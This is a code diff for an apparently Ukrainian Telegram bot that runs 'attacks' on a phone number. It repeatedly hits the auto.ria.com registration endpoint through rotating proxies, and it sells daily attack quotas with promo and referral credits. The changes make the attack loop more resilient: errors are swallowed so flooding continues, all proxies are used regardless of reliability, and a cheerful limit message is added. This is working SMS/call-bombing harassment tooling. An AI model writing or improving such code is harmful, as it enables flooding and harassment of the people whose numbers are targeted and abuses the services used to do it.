@@ -1127,13 +1127,22 @@ async def ukr(number, chat_id):
     proxy_auth = None
 
     # Проксі: отримуємо доступні і налаштовуємо ротацію
-    proxies = await get_available_proxies()
+    try:
+        proxies = await get_available_proxies(min_success_rate=0)  # Використовуємо всі доступні проксі
+    except Exception as e:
+        logging.error(f"Помилка отримання проксі: {e}")
+        proxies = []
+    
     def pick_proxy(i: int):
         if not proxies:
             return None, None
-        p = proxies[i % len(proxies)]
-        url, auth = parse_proxy_for_aiohttp(p)
-        return url, auth
+        try:
+            p = proxies[i % len(proxies)]
+            url, auth = parse_proxy_for_aiohttp(p)
+            return url, auth
+        except Exception as e:
+            logging.error(f"Помилка парсингу проксі: {e}")
+            return None, None
 
     csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
     try:
@@ -1240,14 +1249,21 @@ async def start_attack(number, chat_id):
 
     try:
         # Перед атакою: перевіряємо проксі та оновлюємо метрики
-        await ensure_recent_proxy_check()
+        try:
+            await ensure_recent_proxy_check()
+        except Exception as e:
+            logging.error(f"Помилка перевірки проксі (продовжуємо без неї): {e}")
+        
         while (asyncio.get_event_loop().time() - start_time) < timeout:
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
                 await bot.send_message(chat_id, "🛑 Атака зупинена користувачем.")
                 return
             
-            await ukr(number, chat_id)
+            try:
+                await ukr(number, chat_id)
+            except Exception as e:
+                logging.error(f"Помилка в циклі атаки (продовжуємо): {e}")
             
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
@@ -1259,7 +1275,7 @@ async def start_attack(number, chat_id):
     except asyncio.CancelledError:
         await bot.send_message(chat_id, "🛑 Атака зупинена.")
     except Exception as e:
-        logging.error(f"Помилка при виконанні атаки: {e}")
+        logging.error(f"Критична помилка при виконанні атаки: {e}")
         await bot.send_message(chat_id, "❌ Сталася помилка при виконанні атаки.")
     finally:
         attack_flags[chat_id] = False
@@ -1293,7 +1309,7 @@ async def start_attack(number, chat_id):
         reply_markup=inline_keyboard2
     )
 
-async def parse_proxy_for_aiohttp(proxy_str: str):
+def parse_proxy_for_aiohttp(proxy_str: str):
     try:
         from urllib.parse import urlparse
         parsed = urlparse(proxy_str)
@@ -1308,7 +1324,7 @@ async def parse_proxy_for_aiohttp(proxy_str: str):
 
 async def check_proxy(proxy_url: str, timeout_sec: int = 5) -> tuple:
     start = asyncio.get_event_loop().time()
-    url, auth = await parse_proxy_for_aiohttp(proxy_url)
+    url, auth = parse_proxy_for_aiohttp(proxy_url)
     try:
         timeout = aiohttp.ClientTimeout(total=timeout_sec)
         async with aiohttp.ClientSession(timeout=timeout) as session:
@@ -1447,7 +1463,7 @@ async def handle_phone_number(message: Message):
         # Перевірка лімітів: 30 атак/день + промо/реферальні
         can_attack, attacks_left, promo_attacks, referral_attacks = await check_attack_limits(user_id)
         if not can_attack:
-            await message.answer("❌ На сьогодні ліміт атак вичерпано. Чекаємо на вас завтра або ви можете скористуватись промокодом чи рефералом.")
+            await message.answer("❌ Капітане, на сьогодні ліміт атак вичерпано🙁. Чекаємо на вас завтра або ви можете скористуватись промокодом чи рефералом.")
             return
         # Резервуємо атаку: списуємо з пріоритетом промо -> реферальні -> звичайні
         async with db_pool.acquire() as conn:
